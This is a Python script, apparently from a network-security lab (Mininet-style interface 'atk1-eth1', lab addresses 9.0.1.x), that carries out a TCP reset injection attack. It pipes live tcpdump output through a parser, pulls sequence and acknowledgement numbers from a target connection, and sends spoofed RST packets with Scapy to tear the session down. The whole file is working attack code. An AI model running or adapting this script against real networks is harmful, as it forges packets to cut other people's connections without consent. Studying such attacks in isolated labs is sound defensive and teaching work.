#!/usr/bin/env python

import termcolor as T # grey red green yellow blue magenta cyan white
import os
import ctypes

from subprocess import Popen, PIPE
from scapy.all import *


SOURCE_ADDRESS = '9.0.1.2'
DESTINATION_ADDRESS = '9.0.1.1'


def log(s, col="green"):
	print T.colored(s, col)


def send_rst_packet(srcIP, srcPort, dstIP, dstPort, seqNum, ackNum):
	log('sending RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')

	tcp = TCP(flags="RA")
	tcp.dport=int(srcPort)
	tcp.sport=int(dstPort)
	tcp.seq=int(seqNum)
	tcp.ack=int(ackNum)

	tcp.display()

	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=1)/tcp

	send(spoofed_packet)

	# TODO test if packet is received by R2


def extract_address_port(value):
	values = value.split('.')

	address = values[0] + '.' + values[1] + '.' + values[2] + '.' + values[3]

	port = values[4]

	return address, port


def extract_useful_data(row):
	values = row.split(' ')

	source_address_port, destination_address_port, sequence_number, acknowledge_number = None, None, None, None

	for i, x in enumerate(values):
		print '[', i, ']', x

	if 'ARP' not in values[1]:
		source_address, source_port = extract_address_port(values[2])

		if source_address == SOURCE_ADDRESS:
			destination_address, destination_port = extract_address_port(values[4].replace(':', ''))

			if values[7] == 'seq':
				if ':' in values[8]:
					sequence_number = values[8].replace(',', '').split(':')[1]
				else:
					sequence_number = values[8].replace(',', '')

				acknowledge_number = values[10].replace(',', '')

				print source_address, source_port, destination_address, destination_port, sequence_number, acknowledge_number

				send_rst_packet(source_address, source_port, destination_address, destination_port, sequence_number, acknowledge_number)

	print


def main():
	# TODO 	using tcp dump retrieve absolute SN and AN for R3
	# 		then launch attack using attack_scripts/*
	p = Popen(('sudo', 'tcpdump', '-i', 'atk1-eth1', '-lnS'), stdout=PIPE)

	package_num = 1

	for row in iter(p.stdout.readline, b''):
		print 'package', package_num

		extract_useful_data(row)

		package_num = package_num + 1

if __name__ == "__main__":
	main()
